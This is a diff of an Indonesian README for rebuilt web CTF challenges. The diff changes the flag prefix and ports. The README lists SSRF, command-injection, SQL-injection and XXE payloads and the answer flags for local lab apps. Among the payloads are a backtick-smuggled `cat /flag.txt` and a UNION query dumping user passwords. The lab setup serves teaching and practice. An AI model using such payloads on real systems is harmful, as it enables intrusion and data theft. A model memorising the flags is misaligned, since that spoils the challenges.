@@ -1,6 +1,6 @@
 # 🚩 CTF Challenge Rebuild - Web Exploitation
 
-Rebuild dari challenge CTF Foresty (Seleksi GEMASTIK) - fokus kategori **Web**.
+Rebuild dari challenge CTF LEEXY (Seleksi GEMASTIK) - fokus kategori **Web**.
 Setiap challenge memiliki folder `chall/` (source code + Dockerfile) dan `exploit/` (auto-exploit script).
 
 ---
@@ -56,7 +56,8 @@ docker compose up --build -d
 | Fetcher     | 5000   | http://localhost:5000      | SSRF Bypass         |
 | Nslookup    | 5001   | http://localhost:5001      | Command Injection   |
 | GaG Wiki    | 5002   | http://localhost:5002      | SQL Injection       |
-| SVG Viewer  | 8080   | http://localhost:8080      | XXE Injection       |
+| SVG Viewer  | 8888   | http://localhost:8888      | XXE Injection       |
+| PassForge   | 8120   | http://localhost:8120      | TBD                 |
 
 ---
 
@@ -72,7 +73,7 @@ pip install requests
 python fetcher/exploit/fetcher_exploit.py http://localhost:5000
 python nslookup/exploit/nslookup_exploit.py http://localhost:5001
 python gag-wiki/exploit/gagwiki_exploit.py http://localhost:5002
-python svg-viewer/exploit/svgviewer_exploit.py http://localhost:8080
+python svg-viewer/exploit/svgviewer_exploit.py http://localhost:8888
 ```
 
 ---
@@ -83,19 +84,19 @@ python svg-viewer/exploit/svgviewer_exploit.py http://localhost:8080
 - **Kerentanan:** Server-Side Request Forgery dengan bypass filter
 - **Deskripsi:** Aplikasi memblokir `localhost` dan `127.0.0.1` tapi bisa dibypass dengan representasi IP alternatif
 - **Bypass:** `http://0x7f000001:5000/flag` (hexadecimal IP)
-- **Flag:** `foresty{_r_u_the_next_cve_hunter_a8cdaf}`
+- **Flag:** `LEEXY{_r_u_the_next_cve_hunter_a8cdaf}`
 
 ### 2. Nslookup (Command Injection)
 - **Kerentanan:** Command Injection via backtick
 - **Deskripsi:** Aplikasi menjalankan `nslookup` dengan `shell=True` dan blacklist yang tidak lengkap (backtick ` tidak diblokir)
 - **Payload:** `` `cat /flag.txt`.x ``
-- **Flag:** `foresty{54fb3ec7adecdcb1930ef0528366b98e}`
+- **Flag:** `LEEXY{54fb3ec7adecdcb1930ef0528366b98e}`
 
 ### 3. GaG Wiki (SQL Injection)
 - **Kerentanan:** SQL Injection pada parameter pencarian
 - **Deskripsi:** Query dibangun via string concatenation tanpa parameterized query
 - **Payload:** `' UNION SELECT username,password,'x' FROM users--`
-- **Flag:** `foresty{7bcb6131d0c9f5e4e7e52f50073eeefd}`
+- **Flag:** `LEEXY{7bcb6131d0c9f5e4e7e52f50073eeefd}`
 
 ### 4. SVG Viewer (XXE Injection)
 - **Kerentanan:** XML External Entity Injection
@@ -110,7 +111,7 @@ python svg-viewer/exploit/svgviewer_exploit.py http://localhost:8080
     <title>&flag;</title>
   </svg>
   ```
-- **Flag:** `foresty{670ef0276339a9989da10a47d46a6115}`
+- **Flag:** `LEEXY{670ef0276339a9989da10a47d46a6115}`
 
 ---
 
